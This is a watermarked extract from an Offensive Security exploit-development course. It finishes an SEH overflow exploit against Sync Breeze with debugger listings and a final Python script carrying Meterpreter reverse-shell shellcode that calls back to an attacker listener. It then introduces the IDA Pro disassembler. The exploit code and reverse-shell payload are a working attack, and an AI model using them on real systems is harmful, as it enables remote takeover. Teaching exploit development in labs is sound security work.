Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
128 
Listing 145 shows that our shellcode variable contains a hex character that is not present in other 
parts of our buffer. 
Running our latest proof of concept, we can perform a search for the NOP instructions followed 
by the bytes contained in our shellcode variable right after taking our short jump. 
0:010> t 
eax=77383b02 ebx=01aef540 ecx=1015a2f0 edx=77383b20 esi=00000000 edi=00000000 
eip=01aeff56 esp=01aef444 ebp=01aef458 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
01aeff56 eb06            jmp     01aeff5e 
 
0:010> t 
eax=77383b02 ebx=01aef540 ecx=1015a2f0 edx=77383b20 esi=00000000 edi=00000000 
eip=01aeff5e esp=01aef444 ebp=01aef458 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
01aeff5e 90              nop 
 
0:010> !teb 
TEB at 00392000 
    ExceptionList:        01aef44c 
    StackBase:            01af0000 
    StackLimit:           01aee000 
... 
 
0:010> s -b 01aee000 01af0000 90 90 90 90 43 43 43 43 43 43 43 43 
01aefc70  90 90 90 90 43 43 43 43-43 43 43 43 43 43 43 43  ....CCCCCCCCCCCC 
Listing 146 - Finding our fake shellcode on the stack 
Very nice! We found our shellcode on the stack starting from 0x01aefc74. Before proceeding, we 
want to confirm that our shellcode is not truncated in any way. Dumping the full length of the 
shellcode as DWORDs reveals our entire buffer: 
0:010> dd 01aefc70 L65 
01aefc70  90909090 43434343 43434343 43434343 
01aefc80  43434343 43434343 43434343 43434343 
... 
01aefdf0  43434343 43434343 43434343 43434343 
01aefe00  43434343 
Listing 147 - Confirming that the entire fake shellcode is on the stack 
Our next step is to determine the offset from our current stack pointer to the beginning of our 
shellcode. This will allow us to use the limited space we currently have to assemble a set of 
instructions that will allow us to “island hop”, redirecting execution to our shellcode. 
To determine this, we can simply use ? to subtract between the memory address of the start of 
our shellcode (0x01aefc74) and the current value of the stack pointer. 
0:010> ? 01aefc74 - @esp 
Evaluate expression: 2096 = 00000830 
Listing 148 - Calculating the offset from ESP to our fake shellcode 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
129 
To verify the consistency of the offset, we should restart the application and run 
our exploit multiple times. If possible, we should install the vulnerable application 
on different machines as well. 
If the offset changes slightly each time we launch our exploit, we could introduce 
a bigger NOP sled, placing our shellcode further in our buffer. 
Using the limited space available after our short jump, let’s assemble a few instructions to 
increase the stack pointer by 0x830 bytes followed by a “jmp esp” to jump to our shellcode next. 
We can accomplish the first step by using an “add esp, 0x830” instruction. If we input this 
instruction into msf-nasm_shell, however, we notice that it generates null bytes in the opcodes 
due to the large value: 
kali@kali:~$ msf-nasm_shell  
nasm > add esp, 0x830 
00000000  81C430080000      add esp,0x830 
Listing 149 - Getting null opcodes when using a large value with an ADD operation 
In order to avoid null bytes, we could use smaller jumps (of less than 0x7F121) until we reach the 
desired offset. While this is certainly one option, the assembly language provides better 
alternatives. 
Instead of performing an ADD operation on the ESP register, we can reference the SP register in 
our assembly instruction to do arithmetic operations on the lower 16 bits. Let’s try to generate the 
opcodes for this instruction and confirm it does not contain any bad characters. We will also 
generate the opcodes for a “jmp esp” instruction, which we’ll use to jump to our shellcode right 
after the stack pointer has been adjusted. 
nasm > add sp, 0x830 
00000000  6681C43008        add sp,0x830 
 
nasm > jmp esp 
00000000  FFE4              jmp esp 
Listing 150 - Getting the opcodes for the required assembly instructions 
We then update our proof of concept to include the ADD assembly instruction, followed by a “jmp 
esp” to redirect the execution flow to our shellcode, as shown in Listing 151. 
... 
try: 
  server = sys.argv[1] 
  port = 9121 
  size = 1000 
 
  shellcode = b"\x90" * 8 
  shellcode+= b"\x43" * (400 - len(shellcode)) 
 
121 (Wikipedia - Signed number representations, 2020), https://en.wikipedia.org/wiki/Signed_number_representations 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
130 
 
  inputBuffer = b"\x41" * 124 
  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH) 
  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret 
  inputBuffer+= b"\x90" * 2 
  inputBuffer+= b"\x66\x81\xc4\x30\x08"   # add sp, 0x830 
  inputBuffer+= b"\xff\xe4"               # jmp esp 
  inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode)) 
  inputBuffer+= shellcode 
... 
Listing 151 - seh_overflow_0x08.py: Increasing the stack pointer to reach our shellcode 
After running our latest proof of concept, we will single-step through the ADD operation and 
confirm that our stack alignment was successful before executing the jump: 
0:010> t 
eax=77383b02 ebx=01caf540 ecx=1015a2f0 edx=77383b20 esi=00000000 edi=00000000 
eip=01caff5e esp=01caf444 ebp=01caf458 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
01caff5e 6681c43008      add     sp,830h 
 
0:010> t 
eax=77383b02 ebx=01caf540 ecx=1015a2f0 edx=77383b20 esi=00000000 edi=00000000 
eip=01caff63 esp=01cafc74 ebp=01caf458 iopl=0         nv up ei ng nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286 
01caff63 ffe4            jmp     esp {01cafc74} 
 
0:010> dd @esp L4 
01cafc74  90909090 90909090 43434343 43434343 
 
0:010> t 
eax=77383b02 ebx=01caf540 ecx=1015a2f0 edx=77383b20 esi=00000000 edi=00000000 
eip=01cafc74 esp=01cafc74 ebp=01caf458 iopl=0         nv up ei ng nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286 
01cafc74 90              nop 
Listing 152 - Verifying that ESP points to our shellcode before the JMP ESP instruction 
Listing 152 confirms that we successfully aligned the stack pointer to the address of our 
shellcode variable. We are ready for the final step of the exploit development process! 
4.5.5.1 Exercises 
1. 
Assemble a short jump inside WinDbg and use the opcodes to update the proof of concept. 
2. 
Run the updated proof of concept, ensuring a successful jump over the SEH. 
3. 
Inspect the space available for the shellcode after the short jump and confirm the space 
restriction. 
4. 
Update the proof of concept to include a shellcode as part of the end buffer and attempt to 
locate it inside WinDbg. 
5. 
Restart the application multiple times and confirm that the offset from the stack pointer to 
the shellcode buffer does not change. 
6. 
Try to find alternative instructions that will align the stack pointer with the beginning of the 
shellcode. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
131 
7. 
Update the proof of concept to reach the shellcode buffer. 
4.5.6 Obtaining a Shell 
As a final step, we will use msfvenom to generate a Meterpreter122 payload, excluding the bad 
characters we discovered earlier. We will also increase the size of our NOP slide, ensuring the 
shellcode decoder has space on the stack. This avoids mangling our shellcode. 
The final exploit code is shown in Listing 153 below: 
#!/usr/bin/python 
import socket 
import sys 
from struct import pack 
 
try: 
  server = sys.argv[1] 
  port = 9121 
  size = 1000 
 
  # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.118.5 LPORT=443 -b 
"\x00\x02\x0A\x0D\xF8\xFD" -f python -v shellcode 
  shellcode = b"\x90" * 20 
  shellcode += b"" 
  shellcode += b"\xdb\xdd\xb8\xb3\xe9\xc8\x0b\xd9\x74\x24\xf4" 
  shellcode += b"\x5b\x29\xc9\xb1\x56\x31\x43\x18\x03\x43\x18" 
  shellcode += b"\x83\xeb\x4f\x0b\x3d\xf7\x47\x4e\xbe\x08\x97" 
  shellcode += b"\x2f\x36\xed\xa6\x6f\x2c\x65\x98\x5f\x26\x2b" 
  shellcode += b"\x14\x2b\x6a\xd8\xaf\x59\xa3\xef\x18\xd7\x95" 
  shellcode += b"\xde\x99\x44\xe5\x41\x19\x97\x3a\xa2\x20\x58" 
  shellcode += b"\x4f\xa3\x65\x85\xa2\xf1\x3e\xc1\x11\xe6\x4b" 
  shellcode += b"\x9f\xa9\x8d\x07\x31\xaa\x72\xdf\x30\x9b\x24" 
  shellcode += b"\x54\x6b\x3b\xc6\xb9\x07\x72\xd0\xde\x22\xcc" 
  shellcode += b"\x6b\x14\xd8\xcf\xbd\x65\x21\x63\x80\x4a\xd0" 
  shellcode += b"\x7d\xc4\x6c\x0b\x08\x3c\x8f\xb6\x0b\xfb\xf2" 
  shellcode += b"\x6c\x99\x18\x54\xe6\x39\xc5\x65\x2b\xdf\x8e" 
  shellcode += b"\x69\x80\xab\xc9\x6d\x17\x7f\x62\x89\x9c\x7e" 
  shellcode += b"\xa5\x18\xe6\xa4\x61\x41\xbc\xc5\x30\x2f\x13" 
  shellcode += b"\xf9\x23\x90\xcc\x5f\x2f\x3c\x18\xd2\x72\x28" 
  shellcode += b"\xed\xdf\x8c\xa8\x79\x57\xfe\x9a\x26\xc3\x68" 
  shellcode += b"\x96\xaf\xcd\x6f\xaf\xb8\xed\xa0\x17\xa8\x13" 
  shellcode += b"\x41\x67\xe0\xd7\x15\x37\x9a\xfe\x15\xdc\x5a" 
  shellcode += b"\xfe\xc3\x48\x51\x68\x2c\x24\x13\x6d\xc4\x36" 
  shellcode += b"\xdc\x6c\xaf\xbf\x3a\x3e\x9f\xef\x92\xff\x4f" 
  shellcode += b"\x4f\x43\x68\x9a\x40\xbc\x88\xa5\x8b\xd5\x23" 
  shellcode += b"\x4a\x65\x8d\xdb\xf3\x2c\x45\x7d\xfb\xfb\x23" 
  shellcode += b"\xbd\x77\x09\xd3\x70\x70\x78\xc7\x65\xe7\x82" 
  shellcode += b"\x17\x76\x82\x82\x7d\x72\x04\xd5\xe9\x78\x71" 
  shellcode += b"\x11\xb6\x83\x54\x22\xb1\x7c\x29\x12\xc9\x4b" 
  shellcode += b"\xbf\x1a\xa5\xb3\x2f\x9a\x35\xe2\x25\x9a\x5d" 
  shellcode += b"\x52\x1e\xc9\x78\x9d\x8b\x7e\xd1\x08\x34\xd6" 
  shellcode += b"\x85\x9b\x5c\xd4\xf0\xec\xc2\x27\xd7\x6e\x04" 
 
122 (Metasploit Unleashed), https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
132 
  shellcode += b"\xd7\xa5\x58\xad\xbf\x55\xd9\x4d\x3f\x3c\xd9" 
  shellcode += b"\x1d\x57\xcb\xf6\x92\x97\x34\xdd\xfa\xbf\xbf" 
  shellcode += b"\xb0\x49\x5e\xbf\x98\x0c\xfe\xc0\x2f\x95\xf1" 
  shellcode += b"\xbb\x40\x2a\xf2\x3b\x49\x4f\xf3\x3b\x75\x71" 
  shellcode += b"\xc8\xed\x4c\x07\x0f\x2e\xeb\x18\x3a\x13\x5a" 
  shellcode += b"\xb3\x44\x07\x9c\x96" 
  shellcode+= b"\x43" * (400 - len(shellcode)) 
 
  inputBuffer = b"\x41" * 124 
  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH) 
  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret 
  inputBuffer+= b"\x90" * 2 
  inputBuffer+= b"\x66\x81\xc4\x30\x08"   # add sp, 0x830 
  inputBuffer+= b"\xff\xe4"               # jmp esp 
  inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode)) 
  inputBuffer+= shellcode 
 
  header =  b"\x75\x19\xba\xab" 
  header += b"\x03\x00\x00\x00" 
  header += b"\x00\x40\x00\x00" 
  header += pack('<I', len(inputBuffer)) 
  header += pack('<I', len(inputBuffer)) 
  header += pack('<I', inputBuffer[-1]) 
 
  buf = header + inputBuffer  
 
  print("Sending evil buffer...") 
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
  s.connect((server, port)) 
  s.send(buf) 
  s.close() 
   
  print("Done!") 
   
except socket.error: 
  print("Could not connect!") 
Listing 153 - seh_overflow_0x09.py: Final exploit code 
With the shellcode generated and our final exploit ready, let’s restart the vulnerable service, attach 
WinDbg, set up a Metasploit handler to capture our shell, and run our final exploit. 
This time, however, after WinDbg catches the access violation we will simply let the debugger 
continue execution without any breakpoints as shown below: 
(424.95c): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze 
Enterprise\bin\libpal.dll 
eax=41414141 ebx=0195fa1c ecx=0195ff18 edx=0195f9d4 esi=0195ff18 edi=0195fb20 
eip=00782a9d esp=0195f9a8 ebp=0195fec8 iopl=0         nv up ei ng nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010286 
libpal!SCA_ConfigObj::Deserialize+0x1d: 
00782a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=???????? 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
133 
 
0:008> g 
Listing 154 - Resuming execution after the access violation inside WinDbg 
Once execution resumes, we will switch to our Kali machine where our Metasploit handler was 
able to catch our reverse meterpreter payload. 
kali@kali:~$ sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD 
windows/meterpreter/reverse_tcp; set LHOST 192.168.119.5; set LPORT 443; exploit" 
 
PAYLOAD => windows/meterpreter/reverse_tcp 
LHOST => 192.168.51.128 
LPORT => 443 
[*] Started reverse TCP handler on 192.168.118.5:443  
[*] Sending stage (180291 bytes) to 192.168.120.10 
[*] Meterpreter session 1 opened (192.168.118.5:443 -> 192.168.120.10:49994) 
 
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM 
Listing 155 - Obtaining a reverse shell on the remote system 
Excellent! Our final exploit provides us with a working reverse meterpreter shell on the target 
system. As a final step, we can restart the service and run the exploit without a debugger 
attached to verify that everything still works as expected. 
4.5.6.1 Exercises 
1. 
Generate shellcode using msfvenom and update the previous proof of concept with it. 
2. 
Run the final exploit and obtain a reverse meterpreter shell on the target. 
4.5.6.2 Extra Mile 
1. 
Install the Disk Pulse application, which can be found under 
C:\Installers\seh_overflow\extra_mile\diskpulseent_setup_v10.0.12.exe. Enable the web 
server by opening the Disk Pulse Client, clicking Options, going to the Server menu, and 
ticking the Enable Web Server on port option. 
2. 
Run the provided proof of concept and confirm that you can overwrite the SEH with 
0x41414141. 
3. 
Go through each step of the SEH exploitation process and write a successful exploit for Disk 
Pulse. 
4. 
Which exception handler is overwritten in this application? 
4.5.6.3 Extra Mile 
1. 
Install the KNet web server, which can be found under 
C:\Installers\seh_overflow\extra_mile\02\KNet_1.04b.exe. Start the web server by running the 
KNet application as administrator, clicking Open and selecting the 
C:\Installers\seh_overflow\extra_mile\02\index.html file twice. 
2. 
Run the provided proof of concept and confirm that you can overwrite the SEH with 
0x41414141. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
134 
3. 
Go through each step of the SEH exploitation process and write a successful exploit for the 
KNet web server. 
4.6 Wrapping Up 
In this module, we exploited a known SEH overflow vulnerability in the Sync Breeze application. 
We studied the theory behind Microsoft Windows’ structured exception handler to gain a good 
understanding of how it works and the structures it relies upon. This theory provided a 
foundational understanding of SEH overflows and detailed why we can effectively exploit them. 
Our exploit development process covered several steps beyond those covered in previous 
modules. We explored various structures used by the exception handler, wrote a script to search 
for instruction sequences, and jumped between different sections of our buffer, finally resulting in 
a stable exploit for the vulnerable application. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
135 
 
5 Introduction to IDA Pro 
Source code is often not available during exploit development. This is not a problem during a 
simple buffer overflow - however, in more complicated scenarios, reaching the vulnerable code 
path requires us to craft very specific input. We also need to perform an in-depth analysis when 
issues arise with our exploit to work out what went wrong. 
In cases where more detailed information about the code flow is needed, a debugger alone is not 
enough. WinDbg displays all the instructions in plain ordered assembly rather than an intuitive 
graphical view of the code flow, making it more difficult for exploit developers to understand a 
target application’s logic. 
Vulnerable applications written in a high-level language like C# or Java can easily be decompiled 
back to pseudo-code or a form very close to the original source code. When the target application 
is written in a lower-level language, like C or C++, there is no easy way of reversing the 
compilation process and therefore we need a disassembler. 
A disassembler123 program analyzes a binary and converts the compiled code back to its 
assembly representation. The best disassemblers also try to visually arrange the assembly code 
in a more intuitive way. 
We typically use a disassembler in tandem with a debugger during reverse engineering and more 
advanced exploit development. We can increase our efficiency by combining static and dynamic 
analysis. 
The industry standard disassembler is IDA Pro.124 Another popular disassembler is Ghidra;125 
some lesser-known alternatives are Radare126 and Binary Ninja.127 
This module provides an introduction to IDA Pro, which we will be using in multiple modules of 
this course. 
5.1 IDA Pro 101 
IDA Pro is a tried-and-true disassembler with strong product development behind it, which is 
reflected in its price. The IDA Pro disassembler supports more than 60 families of processors. 
The program also contains a debugger and an even more powerful decompiler for six different 
platforms. A decompiler can analyze the machine code and provide a C-style code that 
represents the given machine code. 
There are a variety of different license options for IDA Pro, all of which cost 1000 USD or more; 
the decompilers are optional additions. A new version of IDA, called IDA Home, is also available at 
a reduced price. 
 
123 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Disassembler 
124 (Hex-Rays, 2020), https://www.hex-rays.com/products/ida/ 
125 (Ghidra, 2020), https://ghidra-sre.org/ 
126 (Radare2, 2020), https://rada.re/n/ 
127 (Binary Ninja, 2020), https://binary.ninja/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
136 
We are going to use IDA Freeware,128 a version that is not for commercial use and does not 
receive any updates or support. IDA Freeware nevertheless provides the features we need to 
perform reverse engineering in this course. 
In the next few sections, we will explain the program’s installation and basic usage. 
5.1.1 Installing IDA Pro 
IDA Pro and IDA Freeware can disassemble both 32-bit and 64-bit applications, but the 
application itself is only available in 64-bit. Due to that and for us to retain any analyzed files, we 
will install IDA Freeware on our Kali machine. 
To avoid confusion throughout this module and others, we will simply refer to 
any version of IDA as IDA Pro instead of being specific about the license version. 
Please note that the Kali version must be 64-bit. We can download the installer 
(idafree70_linux.run) from Hex-Rays129 or the Windows 10 machine (C:\Installers). 
After downloading the installer, we’ll make it executable and install it as shown in Listing 156. 
kali@kali:~/Downloads$ chmod +x idafree70_linux.run 
 
kali@kali:~/Downloads$ sudo ./idafree70_linux.run 
Listing 156 - Installing IDA Free 
After the quick installation process, we will create a symbolic link to the ida64 binary in the 
/usr/bin folder as shown in Listing 157. Next, we’ll create the symbolic link and launch IDA Pro by 
running ida64. 
kali@kali:~/Downloads$ sudo ln -s /opt/idafree-7.0/ida64 /usr/bin 
 
kali@kali:~/Downloads$ ida64 
Listing 157 - Creating a symlink to ida64 
Now that installation is complete, we are ready to cover the basics of the interface. 
5.1.1.1 Exercise 
1. 
Download and install IDA Pro on your Kali VM. 
5.1.2 The IDA Pro User Interface 
This section will cover how we can use IDA Pro to disassemble and save files along with the main 
features of the UI. 
 
128 (Hex-Rays, 2020), https://www.hex-rays.com/products/ida/support/download_freeware/ 
129 (Hex-Rays, 2020), https://www.hex-rays.com/products/ida/support/download_freeware/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
137 
Upon opening IDA Pro, we are presented with the window shown in Figure 29. From here, we can 
either start a new analysis or open a previous IDA Pro database, which is the format IDA Pro uses 
to save analyzed files. 
 
Figure 29: Opening a file with IDA Pro 
Any previously analyzed files will be listed in a text box at the bottom, allowing us to quickly 
continue our work. 
Let’s start a new analysis and disassemble a file. We can copy notepad.exe from 
C:\Windows\System32 on the Windows 10 client to our Kali VM. Switching to IDA Pro, we’ll select 
New and choose notepad.exe from the file dialog. 
Next, we will be prompted to select the file type through the dialog shown in Figure 30. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
138 
 
Figure 30: Selecting the file type 
For 32-bit Windows executables and Dynamic Link Libraries (DLLs), we should select the 
“Portable executable for 80386” option shown above. This is a common denominator for all 32bit 
x86 processors.130 
Once selected, IDA Pro starts performing automatic analysis on the chosen binary. How long this 
analysis takes may vary from several seconds to several minutes, depending on the amount of 
code included in the binary and its complexity. Once analysis is complete, the entry point131 of the 
file is shown in the disassembly window. Occasionally, a message will be displayed about “ntapi”, 
which is related to symbols132 and can be safely ignored. 
Like WinDbg, IDA Pro can download and use symbols from the Microsoft server 
while disassembling the binary. This is only natively available if IDA Pro is 
installed on Windows. For versions other than IDA Freeware, it’s possible to set 
up a symbols server on a Windows computer with a bundled Win32_debugger 
application. 
 
130 (Wikipedia, 2020), common denominator for all 32bit x86 processors 
131 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Entry_point 
132 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-symbols 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
139 
After analyzing a file in IDA Pro, we need to know how to save and close our work, which can be a 
bit confusing at first. When we select Close or Exit from the File menu, we are presented with 
multiple options, as shown in Figure 31. 
 
Figure 31: Options to save IDA Pro database 
A file needs to be packed properly to be successfully saved to an idb database file, so the Pack 
database option should always be checked if we don’t want to lose our changes. 
If, on the other hand, we do not want to save our changes, we would select DON’T SAVE the 
database. 
Now that we know how to open and close files, let’s explore the IDA Pro user interface. There are 
several windows and tabs available, as shown in Figure 32. 
 
Figure 32: IDA Pro interface 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
140 
 
Most reverse engineering work takes place in the main disassembly window, which can show the 
code organized in three different ways: 
• 
Graph view 
• 
Text view 
• 
Proximity view 
The graph view breaks down the program disassembly into functions, with the function code 
organized in basic blocks.133 This view is generally the most intuitive because it shows the code 
control flow by illustrating how each basic block is connected to the others through jumps or 
branches. This is the default view after we open a file. 
 
Figure 33: Graph view in IDA Pro 
Figure 33 shows how assembly code is divided into basic blocks, separated by conditional 
statements or logical splits. 
The green and red arrows originating from a conditional branch indicate if the condition was met 
or not respectively. These conditional statements are the compiled assembly representation of 
source code statements like if and else in low level languages like C or C++. 
 
133 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Basic_block 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
141 
Blue arrows represent basic block edges, where only one potential successor block is present 
(JMP assembly instruction). 
We can reposition the graph while analyzing a selected function by clicking and dragging the 
background of the graph view. 
The text view presents the entire disassembly listing of a program in a linear fashion, as shown in 
Figure 34. Control flow is still indicated by arrows to the left of the listing, but it appears less 
intuitive. 
 
Figure 34: Text view in IDA Pro 
We can switch between graph view and text view by pressing T. 
In the text view, virtual addresses are displayed for each instruction. We can add this for the graph 
view by going to Options > General and ticking the Line prefixes box. 
Figure 35 shows graph view with line prefixes enabled. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
142 
 
Figure 35: Line prefixes in graph view 
Finally, proximity view is a more advanced feature for viewing and browsing the relationships 
between functions, global variables, and constants.134 
We can activate proximity view through View > Open subviews > Proximity browser. An example of 
proximity view is shown in Figure 36. 
 
Figure 36: Proximity view in IDA Pro 
While we’ll mainly work in the disassembly window, there are two other useful windows available: 
the Functions window and the Graph overview. 
As its name suggests, the Functions window (Figure 37) provides a list of all the functions 
present in the program that IDA Pro managed to obtain through automatic analysis. 
 
134 (Hex-Rays, 2011), http://www.hexblog.com/?p=468 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
143 
 
Figure 37: Functions window in IDA Pro 
Double-clicking an entry in the Functions window will cause IDA Pro to show the start of the 
selected function directly in the disassembly window. 
To easily navigate the disassembly of large functions, we can use the Graph overview window 
(Figure 38) to rapidly pan around the function graph. 
 
Figure 38: Graph overview window 
The Graph overview always shows the same function currently being analyzed in the main 
disassembly view. A dotted outline in the Graph overview indicates which part of the code is 
currently displayed in the disassembly window. 
We can navigate to previously viewed basic blocks using the forward and backward arrows 
(Figure 39) in the navigation bar at the top left part of the IDA Pro window. 
 
Figure 39: Navigation arrows in IDA Pro 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
144 
 
Finally, we’ll cover how to reset the IDA Pro layout to its default setting. It can be difficult to return 
windows to their original place after dragging them to customize the graphical layout. 
To adjust a single window, let’s place the cursor just below the title of the window. When a small 
bar appears, as shown in Figure 40, we can drag and dock the window next to other windows. 
 
Figure 40: Menu bar to drag and dock windows 
We can also completely reset the UI using Windows > Reset desktop. 
This section provided an overview of the most basic actions and user interface for IDA Pro. Next, 
we’ll cover some of the program’s basic functionality that can aid our work. 
5.1.2.1 Exercises 
1. 
Copy notepad.exe from the Windows 10 machine onto your Kali VM and analyze it with IDA 
Pro. 
2. 
Use the different views and navigate around the disassembled file to get familiar with the 
interface. 
3. 
Save the disassembled file. 
5.1.3 Basic Functionality 
IDA Pro offers features that can help speed our reverse engineering and exploit development 
processes. We’ll go over how to use these features in this section so we can leverage them in 
future modules. 
In IDA Pro, we can color code basic blocks to work more efficiently. Color coding helps empower 
our visual understanding of code flow in graph view. 
Every basic block has a color palette icon at the top left corner as shown in Figure 41. 
 
Figure 41: Color palette icon 
After clicking on the color palette icon, a coloring dialog box opens (Figure 42) from which we can 
select any color we like. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
145 
 
Figure 42: Coloring dialog box 
Selecting which colors to use is personal taste, but a combination of two colors can help show 
desired and undesired paths through basic blocks, as illustrated in Figure 43. 
 
Figure 43: Example of color coding 
Another way to speed our work along in IDA Pro is by commenting on a specific line of assembly 
code. This can help us remember exactly what is happening at that particular code location. 
We can set a comment through the dialog box by placing the cursor at a specific line of code and 
pressing the colon (:) key. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
146 
 
Figure 44: Creating comments 
Once accepted, the comment is added to the right of the assembly instruction, as shown in Figure 
45. 
 
Figure 45: Comment added in basic block 
In addition to leveraging color coding and comments, we can also rename functions and 
variables to aid in our analysis. 
If symbols files are loaded as part of the disassembly, the names included within them are used. 
Otherwise, a default function name of “sub_XXXXXX” and a global variable name of 
“dword_XXXXXX” is used. 
We can rename a function by locating it in the Functions window, right-clicking it, and selecting 
Edit function…. From here, we can modify the function name. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
147 
 
Figure 46: Editing a function name 
We can also rename functions by pressing the n key when the function name is open in the main 
assembly window. This also applies to global variables. 
Once completed, the function name is updated, as shown in Figure 47. All function references will 
also be updated. 
 
Figure 47: Renamed function 
The last analysis feature we will explain in this section is how to create and list bookmarks. 
We can create a bookmark by choosing the line we want to bookmark and pressing E+m. This 
brings up the dialog box shown in Figure 48 for naming and creating our new bookmark. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
148 
 
Figure 48: Creating a bookmark 
Whenever we need to come back to the same location in the code, pressing C+m will bring up 
a dialog to select a bookmark as displayed in Figure 49. 
 
Figure 49: Selecting a bookmark 
Double-clicking the bookmark name will jump the main disassembly window to the code in 
question. 
In this section, we have gone through some of the features that can help our analysis during 
reverse engineering and exploit development when using IDA Pro. 
5.1.3.1 Exercises 
1. 
Experiment with color coding, comments, and renaming. 
2. 
Create a bookmark and jump back to it. 
5.1.4 Search Functionality 
During analysis in IDA Pro, we often need to search for sequences of bytes, strings, and function 
names in a target executable or dynamic link library. 
The information we need to search for could come from another static analysis program such as 
the Windows SysInternals Strings135 tool, directly from a dynamic analysis session, or from 
sniffed network traffic, for example. 
 
135 (Microsoft, 2017), https://docs.microsoft.com/en-us/sysinternals/downloads/strings 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
149 
Moreover, a search for function names may stem from a public vulnerability disclosure or from a 
suspected behavior of a chunk of code calling into a particular function such as reading a file or 
receiving a network packet. 
We can search for a string using the text option in the Search menu, which displays the dialog 
shown in Figure 50. 
 
Figure 50: Search for strings 
We can likewise search for an immediate value, such as a hardcoded DWORD or a specific 
sequence of bytes, from the Search menu or by using E+i and E+b, respectively. 
We can search for function names in the Functions window or through the Jump to function 
command from the Jump menu. In the dialog window, we’ll right-click and use Quick filter to 
